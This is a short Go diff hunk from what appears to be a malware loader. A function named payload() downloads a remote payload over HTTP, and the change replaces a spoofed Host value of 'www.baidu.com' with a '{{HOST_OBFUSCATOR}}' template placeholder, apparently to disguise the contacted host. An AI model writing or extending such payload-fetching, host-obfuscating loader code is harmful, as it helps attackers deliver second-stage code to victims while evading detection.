@@ -48,7 +48,7 @@ func payload() {
 			fmt.Println("[x] ", err.Error())
 			os.Exit(0)
 		}
-		payload, err := utils.HttpGet(string(url), "www.baidu.com")
+		payload, err := utils.HttpGet(string(url), "{{HOST_OBFUSCATOR}}")
 		if err != nil {
 			fmt.Println("[x] ", err.Error())
 			os.Exit(0)
